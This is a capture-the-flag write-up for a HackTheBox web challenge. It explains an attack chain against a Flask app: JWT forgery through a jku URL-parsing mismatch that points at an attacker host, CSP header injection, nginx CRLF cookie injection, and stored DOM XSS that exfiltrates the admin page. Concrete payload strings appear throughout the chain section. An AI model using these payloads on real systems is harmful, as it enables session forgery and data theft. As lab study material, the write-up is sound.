# BoneChewerCon (NOT the "baby" one) — SOLVED (writeup-assisted on the final pivot)

- Platform/event: HackTheBox, HTB x University Qualifier CTF 2020. 4/4 stars.
- Target: `154.57.164.73:30433`, source supplied (white-box).
- Stack: Flask + uWSGI behind nginx, SQLite, RS256 JWT with a `jku` header,
  headless-Chrome admin bot on loopback.
- Flag: read out-of-band from the admin bot's rendered page; value not committed.

## Name collision — read this first

Two different HTB challenges are called BoneChewerCon. The card already in this
repo, `htb-bonechewercon-method-not-allowed-whoops-env-disclosure`, is the
**"baby BoneChewerCon"** variant: nginx/PHP/Laravel/Whoops, solved by triggering a
debug page. Its preconditions (PHP, Whoops) are absent here and reusing it would
have wasted the session. `tools/chain_match.py` scores on **signals, not names**, so
querying it with the challenge name returned zero candidates — which is correct
behaviour, not a miss.

## Gates

`check_if_authenticated(check_auth='admin', check_ip=True)` guards `/list` and
`/api/list`; `check_auth` is evaluated first. `/api/bot/login` needs only the IP and
hands out an admin JWT. Confirmed live that the IP gate is real: `/api/bot/login`
→ `"Your IP is not allowed"`. So the bot is mandatory.

## Chain

1. **jku forgery.** `session.fetch_jku` derives the host as
   `netloc.split('@')[1]` and compares it to `localhost`, but `requests` resolves the
   host as `urlsplit().hostname`, i.e. `rpartition('@')[2]`. They disagree on
   `https://abc@localhost@ATTACKER/jwks.json`: the check sees `localhost`, the client
   connects to ATTACKER. (The neighbouring scheme/port checks are dead code — in
   Python 3 `filter(...)` returns a truthy generator object, so `not filter(...)` is
   always False.) Serve a JWKS whose `n`/`e` are **decimal strings**, because the app
   does `jwk[field].isdigit()` before converting. Sign a JWT with the matching private
   key and `username=admin`.
   Confirmed live: `GET /` → 200, and `/api/list` flipped from `"You are not admin"`
   to `"Your IP is not allowed"`.
2. **CSP header injection.** `REPORT_URI = f"/api/csp-report?token={g.session.get('token')}"`
   is concatenated raw into the header, and `token` is a JWT claim we now control. A
   token of `AAAA; script-src 'self' 'unsafe-inline'; connect-src *; img-src *` appends
   real directives. Within one policy an explicit `script-src` overrides the
   `default-src 'self'` fallback, so inline handlers execute.
3. **Plant that cookie on the bot (nginx CRLF).** `location @notfound` does
   `return 302 "http://$http_host/list?error_path=$uri"`, and `$uri` is
   percent-**decoded**. `/list/x%0d%0aSet-Cookie:%20auth=<JWT>;%20Path=/list` injects a
   real `Set-Cookie` into the 302. `Path=/list` matters: RFC 6265 sends longer-path
   cookies first and Werkzeug's `request.cookies.get` takes the first, so the planted
   cookie beats the bot's own `Path=/` one.
4. **Delivery.** Stored DOM XSS: `main.js` does
   `tbody.innerHTML += \`...${submission.idea}...\``. Under the strict CSP no JS runs,
   but **navigation is not covered by `default-src`**, so a
   `<meta http-equiv="refresh">` still fires and walks the bot into the CRLF URL.
   One submitted `idea` carries both the meta refresh and the `<img onerror>`; the
   handler is inert on the first pass and executes on the second, after the CSP has
   been weakened.

## Evidence ancestry

- jku bypass confirmed by a read-only probe (200 on `/`, and the error message on
  `/api/list` changing) before anything was written.
- The attacker JWKS endpoint was hit by the **bot's** request cycle, proving the
  planted cookie was actually decoded, immediately before the exfil callback arrived.
- The callback carried the whole rendered admin table, including the `/list does not
  exist` flash — which independently proves the CRLF redirect landed on
  `/list?error_path=/list`.

## Reusable lessons

- Two URL parsers in one code path is the bug. Compare what the *validator* extracts
  against what the *HTTP client* resolves; `a@b@c` splits them.
- `filter()`/`map()` in a boolean test is always truthy in Python 3 — a very common
  way for a "check" to be silently dead.
- Any value interpolated into a CSP header is a directive-injection sink.
- nginx `$uri` is decoded; `$request_uri` is not. `$uri` in a `return 302` is CRLF
  injection, and nginx treats this as the operator's misconfiguration, not a bug.
- A strict `default-src` does not stop navigation or `form-action`; meta refresh
  remains a reliable pivot for a no-JS CSP situation.
- Dangling markup absorbs **forward only**. Here every submission renders *below* the
  flag row, so no amount of dangling markup reaches it — which is what forces the
  CSP-injection route instead.
